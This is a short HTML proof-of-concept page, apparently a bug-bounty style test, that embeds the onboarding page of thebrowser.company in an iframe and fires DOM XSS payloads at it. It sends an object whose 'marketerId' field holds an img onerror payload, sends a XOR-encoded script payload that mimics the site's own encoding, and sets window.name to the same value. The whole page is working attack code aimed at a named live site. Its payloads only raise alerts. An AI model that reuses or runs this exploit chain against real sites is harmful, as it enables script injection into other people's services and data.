<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ðŸ’¥ DOM XSS â€“ Full Exploit Chain</title>
</head>
<body>
  <h2>âœ… PoC: DOM XSS via postMessage + window.name + object payload</h2>
  <p>This PoC tests multiple XSS vectors against thebrowser.company</p>

  <iframe id="target" src="https://thebrowser.company/onboarding" width="100%" height="600" style="border:2px solid #0f0;" sandbox="allow-scripts allow-same-origin"></iframe>

  <script>
    const iframe = document.getElementById("target");

    // XOR encoding (from site logic)
    function xorEncode(str, key = 0x66) {
      const keyHex = key.toString(16).padStart(2, '0');
      const encoded = Array.from(str).map(c =>
        (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0')
      ).join('');
      return keyHex + encoded;
    }

    const xorPayload = "<script>alert('XSS from XOR')</script>";
    const encodedXOR = xorEncode(xorPayload);

    iframe.onload = () => {
      console.log("âœ… iframe loaded");

      // âœ… Send object-based payload
      const structuredPayload = {
        message: "OB_SHOULD_SHOW_PICKER",
        content: {
          marketerId: [
            `<img src=x onerror=alert('XSS via object')>`
          ]
        }
      };
      iframe.contentWindow.postMessage(structuredPayload, "*");
      console.log("ðŸš€ Structured object postMessage sent.");

      // âœ… Send XOR-encoded payload via postMessage
      iframe.contentWindow.postMessage(encodedXOR, "*");
      console.log("ðŸš€ XOR payload sent via postMessage");

      // âœ… Also set window.name for any listener inside iframe
      iframe.contentWindow.name = encodedXOR;
      console.log("ðŸ§  window.name set.");
    };
  </script>
</body>
</html>
